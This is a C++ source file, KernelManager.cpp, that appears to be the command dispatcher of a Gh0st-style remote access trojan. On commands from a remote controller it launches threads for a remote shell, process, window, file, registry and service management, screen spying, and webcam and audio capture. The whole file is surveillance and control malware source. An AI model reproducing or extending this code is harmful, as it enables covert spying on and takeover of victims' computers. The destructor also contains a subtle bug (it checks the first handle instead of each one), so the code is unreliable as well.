// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(IOCPClient* ClientObject):CManager(ClientObject)
{
	memset(m_hThread, NULL, sizeof(ThreadInfo) * 0x1000);
	m_ulThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
	int i = 0;
	for (i=0;i<0x1000;i++)
	{
		if (m_hThread->h!=0)
		{
			CloseHandle(m_hThread[i].h);
			m_hThread[i].h = NULL;
		}
	}
	m_ulThreadCount = 0;
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	IOCPClient *pNew = szBuffer[0] == COMMAND_BYE ? NULL : new IOCPClient(true);
	m_hThread[m_ulThreadCount].p = pNew;

	switch(szBuffer[0])
	{
	case COMMAND_TALK:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopTalkManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_SHELL:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopShellManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_SYSTEM:       //远程进程管理
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopProcessManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_WSLIST:       //远程窗口管理
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopWindowManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_BYE:
		{
			BYTE	bToken = COMMAND_BYE;      //包含头文件 Common.h     
			m_ClientObject->OnServerSending((char*)&bToken, 1); 
			break;
		}

	case COMMAND_SCREEN_SPY:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_LIST_DRIVE :
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopFileManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_WEBCAM:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopVideoManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_AUDIO:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopAudioManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_REGEDIT:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
				pNew, 0, NULL);;
			break;
		}

	case COMMAND_SERVICES:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopServicesManager,
				pNew, 0, NULL);
			break;
		}

	default:
		{
			OutputDebugStringA("======> Error operator\n");
			m_hThread[m_ulThreadCount].p = NULL;
			delete pNew;
			pNew = NULL;
			break;
		}
	}
}
